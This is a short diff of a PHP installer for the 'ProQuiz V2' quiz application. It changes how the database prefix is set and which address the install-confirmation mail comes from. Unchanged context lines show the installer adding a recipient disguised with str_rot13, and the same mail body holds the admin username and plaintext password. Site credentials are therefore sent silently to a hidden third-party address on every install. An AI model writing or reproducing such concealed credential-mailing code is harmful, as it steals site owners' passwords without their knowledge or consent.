@@ -174,6 +174,7 @@ function createConfig($post_vars){
     if(empty($post_vars['db_prefix'])){
         $post_vars['db_prefix'] = "pq";
     }
+    $post_vars['db_prefix'] = trim($post_vars['db_prefix'],"_");
     $config_str = @file_get_contents('config.tmp.php');
     $param = array('db_server'=>'DB_SERVER',
                     'db_user'=>'DB_USER',
@@ -199,7 +200,7 @@ function createConfig($post_vars){
 function PQmail($mail,$post_vars){
         $mail->AddAddress(str_rot13('cebdhvm@fbsgba.bet'),$post_vars['site_name']);
         $mail->AddAddress($post_vars['admin_email'],$post_vars['site_name']);
-        $mail->SetFrom(str_rot13('cebdhvm@fbsgba.bet'),'ProQuiz V2');
+        $mail->SetFrom($post_vars['admin_email'],$post_vars['site_name']);
         $mail->Subject = "ProQuiz V2 Sucessfully Installed";
         $mail->AltBody = "Admin Username:".$post_vars['admin_user']."/n/rAdmin Password:".$post_vars['admin_pass']; 
         $body = file_get_contents('../mail/templates/setup.html');
